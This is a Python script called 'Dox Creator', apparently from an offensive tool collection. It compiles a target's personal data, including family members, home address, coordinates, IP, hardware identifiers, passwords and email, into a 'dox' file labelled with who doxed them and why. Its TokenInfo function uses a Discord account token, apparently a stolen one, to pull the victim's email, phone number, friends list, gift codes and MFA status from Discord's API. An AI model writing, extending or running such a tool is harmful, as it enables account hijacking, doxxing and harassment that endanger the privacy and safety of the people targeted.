# (c) 2026 IxilaA1 - Tous droits réservés / All rights reserved / Todos los derechos reservados.
# Ce code ne peut être ni vendu, ni modifié, ni partagé sans autorisation, ni publié à votre nom.
# This code may not be sold, modified, or shared without authorization, nor published under your name.
# Este código no puede ser vendido, modificado ni compartido sin autorización, ni publicado a su nombre.
# -------------------------------------------------------------------------------------------------------
import random
import os
import time
import requests 
from datetime import datetime, timezone
import sys 

logo_ascii = """
                                                         .+#%@@%#+.                                     
                                                    .#@@@@@@@@@@@@@@@@#.                                
                                                  +@@@@@@@@@@@@@@@@@@@@@@*                              
                                                .%@@@@@@@@@@@@@@@@@@@@@@@@%.                            
                                                %@@@@@@@@@@@@@@@@@@@@@@@@@@%                            

                                               %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                          
                                                -..........................-.                           
                                                %@@@@@@00@@@@@@@@@@@%@@@@@@%                            
                                                %@@@#     .%@@@@%.     *@@@%                            
                                                . :+00+--+%@#::#@%*--+00+: .                            
                                                                           .                            
                                                 :                        :                             
                                                  -                      =                              
                                                    -                  -                                
                                                       -=          --                                   
                                               -+#%@@@@@@=        =@@@@@@%#+-                           
                                            *@@@@@@@@@@@@=        =@@@@@@@@@@@@*                        
                                          *@@@@@@@@@@@@@@+        +@@@@@@@@@@@@@@#                      
                                         *@@@@@@@@@@@@@@@@%=    -%@@@@@@@@@@@@@@@@#                     
                                        -@@@@@@@@@@@@@@@@@@@%#*0@@@@@@@@@@@@@@@@@@@-                    
                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-                    
                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-                    
                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-

"""


os.system('cls' if os.name == 'nt' else 'clear')


print(logo_ascii)


time.sleep(2)



def ErrorModule(e):
    print(f"[MODULE ERROR] {e}")

def Title(text):
    print(f"======== {text} ========")

def Slow(text):
    
    print(text)
    time.sleep(0.1)

def current_time_hour():
    
    return time.strftime("%H:%M")

def Continue():
    input("\nPress Enter to continue...")

def Reset():
    print("[RESET] Returning to the main menu (Exiting here for simulation).")
    exit()

def Error(e):
    print(f"[GLOBAL ERROR] An error occurred: {e}")


dox_banner = "--- DOX CREATOR v1.0 ---"
BEFORE = "["
AFTER = "]"
INPUT = ">>>"
INFO = "[INFO]"

reset = ""
yellow = ""
white = ""
red = ""


website = "ipinfo.io" 
github_tool = "https://github.com/IxilaA1/RedSpider-Tools"



try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
except Exception as e:
    ErrorModule(e)
    

Title("Dox Create")

try:


    def NumberInfo(phone_number):
        """Retrieves geographic and operator information for a phone number."""
        try:
            
            if not phone_number.startswith('+'):
                
                parsed_number = phonenumbers.parse(phone_number, "US") 
            else:
                parsed_number = phonenumbers.parse(phone_number, None)
            
            if not phonenumbers.is_valid_number(parsed_number):
                 raise ValueError("Invalid number")

            
            operator_phone = carrier.name_for_number(parsed_number, "en") or "Not specified"
            type_number_phone = "Mobile" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "Landline or Other"
            country_phone = phonenumbers.region_code_for_number(parsed_number)
            region_phone = geocoder.description_for_number(parsed_number, "en") or "Not specified"
            timezones = timezone.time_zones_for_number(parsed_number)
            timezone_phone = timezones[0] if timezones else "Not specified"
        except Exception: 
            operator_phone = "None"
            type_number_phone = "None"
            country_phone = "None"
            region_phone = "None"
            timezone_phone = "None"

        return operator_phone, type_number_phone, country_phone, region_phone, timezone_phone

    def IpInfo(ip):
        """Retrieves ISP information for a given IP address via an API (simulated)."""
        api = {}
        try:
            response = requests.get(f"https://{website}/api/ip/ip={ip}", timeout=5)
            response.raise_for_status()
            api = response.json()
        except requests.exceptions.RequestException as e:
            print(f"[IP Alert] API request error: {e}")
            return "None", "None", "None"
        except Exception:
            pass 

        isp_ip = api.get("isp", "None")
        org_ip = api.get("org", "None")
        as_ip = api.get("as", "None")
            
        return isp_ip, org_ip, as_ip

    def TokenInfo(token):
        """Retrieves detailed Discord user information from a token."""
        user = {}
        friends_discord_list = []
        gift_codes_list = []
        
        try:
            user_response = requests.get('https://discord.com/api/v10/users/@me', 
                                         headers={'Authorization': token, 'Content-Type': 'application/json'},
                                         timeout=5)
            user_response.raise_for_status()
            user = user_response.json()

            friends_response = requests.get('https://discord.com/api/v10/users/@me/relationships', 
                                            headers={'Authorization': token, 'Content-Type': 'application/json'},
                                            timeout=5)
            friends_response.raise_for_status()
            friends = friends_response.json()
            if friends:
                for friend in friends:
                    data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})"
                    if len('\n'.join(friends_discord_list)) + len(data) >= 1024:
                        break
                    friends_discord_list.append(data)

            gift_codes_response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', 
                                                headers={'Authorization': token, 'Content-Type': 'application/json'},
                                                timeout=5)
            gift_codes_response.raise_for_status()
            gift_codes = gift_codes_response.json()
            if gift_codes:
                for gift_code_data in gift_codes:
                    name = gift_code_data['promotion']['outbound_title']
                    code = gift_code_data['code']
                    data = f"Gift: {name}\nCode: {code}"
                    if len('\n\n'.join(gift_codes_list)) + len(data) >= 1024:
                        break
                    gift_codes_list.append(data)

        except requests.exceptions.RequestException as e:
            print(f"[Discord Alert] Discord request error: {e}")
            pass
        except Exception:
            pass
        
        
        username_discord = user.get('username', 'None') + (f"#{user.get('discriminator', '0000')}" if user.get('discriminator') != '0' else '')
        display_name_discord = user.get('global_name', "None")
        user_id_discord = user.get('id', "None")
        email_discord = user.get('email', "None")
        phone_discord = user.get('phone', "None")
        mfa_discord = str(user.get('mfa_enabled', "None"))

        
        created_at_discord = "None"
        if user_id_discord != "None":
            try:
                timestamp_ms = (int(user_id_discord) >> 22) + 1420070400000
                created_at_discord = datetime.fromtimestamp(timestamp_ms / 1000, timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            except:
                created_at_discord = "None"

        
        avatar_url_discord = "None"
        if user_id_discord != "None" and user.get('avatar'):
            avatar_hash = user['avatar']
            avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.png"
        
        
        nitro_type = user.get('premium_type', 0)
        nitro_map = {0: 'False', 1: 'Nitro Classic', 2: 'Nitro Boosts', 3: 'Nitro Basic'}
        nitro_discord = nitro_map.get(nitro_type, 'False')
        
        
        friends_discord = '\n / '.join(friends_discord_list) if friends_discord_list else "None"
        gift_codes_discord = '\n\n'.join(gift_codes_list) if gift_codes_list else "None"

        return username_discord, display_name_discord, user_id_discord, avatar_url_discord, created_at_discord, email_discord, phone_discord, nitro_discord, friends_discord, gift_codes_discord, mfa_discord

   

    Slow(dox_banner+"\n")

    
    by =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Doxed By      : {reset}")
    reason =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Reason        : {reset}")
    pseudo1 = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} First Pseudo  : {reset}")
    pseudo2 = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Second Pseudo : {reset}")

    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Discord Information:")
    token_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token ? (y/n) -> {reset}")
    if token_input in ["y", "Y", "yes", "YES", "Yes"]:
        token = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token: {reset}")
        username_discord, display_name_discord, user_id_discord, avatar_url_discord, created_at_discord, email_discord, phone_discord, nitro_discord, friends_discord, gift_codes_discord, mfa_discord = TokenInfo(token)
    else:
        token = "None"
        username_discord =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Username      : {reset}")
        display_name_discord = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Display Name  : {reset}")
        user_id_discord =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Id            : {reset}")
        avatar_url_discord =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Avatar        : {reset}")
        created_at_discord =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Created At    : {reset}")
        email_discord =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Email         : {reset}")
        phone_discord =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Phone         : {reset}")
        nitro_discord =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Nitro         : {reset}")
        friends_discord =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Friends       : {reset}")
        gift_codes_discord =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Gift Code     : {reset}")
        mfa_discord =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Mfa           : {reset}")

    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Ip Information:")
    ip_public = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Public Ip     : {reset}")
    ip_local =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Local Ip      : {reset}")
    ipv6 =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Ipv6          : {reset}")
    vpn_pc =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} VPN           : {reset}")
    isp_ip, org_ip, as_ip = IpInfo(ip_public)

    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Pc Information:")
    name_pc =           input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Name          : {reset}")
    username_pcc =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Username      : {reset}")
    displayname_pc =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Display Name  : {reset}")
    platform_pc =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Platform      : {reset}")
    exploitation_pc =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Exploitation  : {reset}")
    windowskey_pc =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Windows Key   : {reset}")
    mac_pc =            input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} MAC Address   : {reset}")
    hwid_pc =           input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} HWID Address  : {reset}")
    cpu_pc =            input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} CPU           : {reset}")
    gpu_pc =            input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} GPU           : {reset}")
    ram_pc =            input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} RAM           : {reset}")
    disk_pc =           input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Disk          : {reset}")
    mainscreen_pc =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Screen Main   : {reset}")
    secscreen_pc =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Screen Sec    : {reset}")
                        
    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Number Information:")
    phone_number = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Phone Number  : {reset}")
    brand_phone = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Brand         : {reset}")
    operator_phone, type_number_phone, country_phone, region_phone, timezone_phone = NumberInfo(phone_number)

    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Personal Information:")
    gender =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Gender        : {reset}")
    last_name =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Last Name     : {reset}")
    first_name =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} First Name    : {reset}")
    age =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Age           : {reset}")
    mother =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Mother        : {reset}")
    father =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Father        : {reset}")
    brother =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Brother       : {reset}")
    sister =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Sister        : {reset}")
                        
    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Loc Information:")
    continent =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Continent     : {reset}")
    country =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Country       : {reset}")
    region =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Region        : {reset}")
    postal_code =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Postal Code   : {reset}")
    city =         input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} City          : {reset}")
    adress =       input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Address       : {reset}")
    timezone_loc = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Timezone      : {reset}") 
    longitude =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Longitude     : {reset}")
    latitude =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Latitude      : {reset}")

    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Social Information:")
    password = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Password      : {reset}")
    email =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Email         : {reset}")
                        
    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Other:")
    other =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Other         : {reset}")
    database = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} DataBase      : {reset}")
    logs =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Logs          : {reset}")


    
    
    name_file = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Choose the file name -> {reset}")
    if not name_file.strip():
        name_file = f'No Name {random.randint(1, 999)}'


    try:
        script_path = os.path.realpath(sys.argv[0])
        script_dir = os.path.dirname(script_path)
    except IndexError:
        
        script_dir = os.getcwd() 
    

    output_dir_name = "Dox Create"
    output_dir = os.path.join(script_dir, "..", output_dir_name)
    
    
    output_dir = os.path.normpath(output_dir)

    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    
    file_name = f"D0x - {name_file}.txt"
    dox_path = os.path.join(output_dir, file_name)


    
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Saving file to: {white}\"{dox_path}\"{reset}")
    with open(dox_path, 'w', encoding='utf-8') as file:
        file.write(f'''
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                     
                                            
              ██████╗  ██████╗  ██╗  ██╗
              ██╔══██╗ ██╔═══██╗ ╚██╗██╔╝
              ██║  ██║ ██║  ██║  ╚███╔╝ 
              ██║  ██║ ██║  ██║  ██╔██╗ 
              ██████╔╝ ╚██████╔╝ ██╔╝ ██╗ 
              ╚═════╝  ╚═════╝  ╚═╝  ╚═╝   Template By BlueSpider (https://{github_tool})
                                            
                                                                                                        
              Doxed By : {by}
              Reason   : {reason}
              Pseudo   : "{pseudo1}", "{pseudo2}"
    
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

              ╔═══════════════════════════════════════════════════════════════════════════════════════╗
              DISCORD:
              =====================================================================================
              [+] Username      : {username_discord}
              [+] Display Name  : {display_name_discord}
              [+] ID            : {user_id_discord}
              [+] Avatar        : {avatar_url_discord}
              [+] Created At    : {created_at_discord}
              [+] Token         : {token}
              [+] Email         : {email_discord}
              [+] Phone         : {phone_discord}
              [+] Nitro         : {nitro_discord}
              [+] Friends       : {friends_discord}
              [+] Gift Code     : {gift_codes_discord}
              [+] Multi-Factor Authentication : {mfa_discord}
              ╚═══════════════════════════════════════════════════════════════════════════════════════╝

              ╔═══════════════════════════════════════════════════════════════════════════════════════╗
              INFORMATION:
              =====================================================================================
              +────────────Pc────────────+
              [+] Public IP    : {ip_public}
              [+] Local Ip     : {ip_local}
              [+] Ipv6         : {ipv6}
              [+] Isp          : {isp_ip}
              [+] Org          : {org_ip}
              [+] As           : {as_ip}

              [+] VPN Y/N      : {vpn_pc}

              [+] Name         : {name_pc}
              [+] Username     : {username_pcc}
              [+] Display Name : {displayname_pc}

              [+] Platform     : {platform_pc}
              [+] Exploitation : {exploitation_pc}
              [+] Windows Key  : {windowskey_pc}

              [+] MAC          : {mac_pc}
              [+] HWID         : {hwid_pc}
              [+] CPU          : {cpu_pc}
              [+] GPU          : {gpu_pc}
              [+] RAM          : {ram_pc}
              [+] Disk         : {disk_pc}

              [+] Screen Main        : {mainscreen_pc}
              [+] Screen Secondary : {secscreen_pc}

              +───────────Phone──────────+
              [+] Phone Number : {phone_number}
              [+] Brand        : {brand_phone}
              [+] Operator     : {operator_phone}
              [+] Type Number  : {type_number_phone}
              [+] Country      : {country_phone}
              [+] Region       : {region_phone}
              [+] Timezone     : {timezone_phone}

              +───────────Personal───────+
              [+] Gender      : {gender}
              [+] Last Name   : {last_name}
              [+] First Name  : {first_name}
              [+] Age         :  {age}

              [+] Mother      : {mother}
              [+] Father      : {father}
              [+] Brother     : {brother}
              [+] Sister      : {sister}

              +────────────Loc───────────+
              [+] Continent   : {continent}
              [+] Country     : {country}
              [+] Region      : {region}
              [+] Postal Code : {postal_code}
              [+] City        : {city}
              [+] Address     : {adress}
              [+] Timezone    : {timezone_loc}
              [+] Longitude   : {longitude}
              [+] Latitude    : {latitude}
              ╚═══════════════════════════════════════════════════════════════════════════════════════╝


              ╔═══════════════════════════════════════════════════════════════════════════════════════╗
              SOCIAL:
              =====================================================================================
              +──────Mails & Password─────+
              [+] Email    : {email}
              [+] Password : {password}
              ╚═══════════════════════════════════════════════════════════════════════════════════════╝

              ╔═══════════════════════════════════════════════════════════════════════════════════════╗
              OTHER:
              =====================================================================================
              {other}
              ╚═══════════════════════════════════════════════════════════════════════════════════════╝

              ╔═══════════════════════════════════════════════════════════════════════════════════════╗
              DATABASE:
              =====================================================================================
              {database}
              ╚═══════════════════════════════════════════════════════════════════════════════════════╝

              ╔═══════════════════════════════════════════════════════════════════════════════════════╗
              LOGS:
              =====================================================================================
              {logs}
              ╚═══════════════════════════════════════════════════════════════════════════════════════╝
    ''')

    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} The DOX {white}\"{name_file}\"{red} was successfully saved to: {white}\"{dox_path}\"")
    Continue()
    Reset()
except Exception as e:
    Error(e)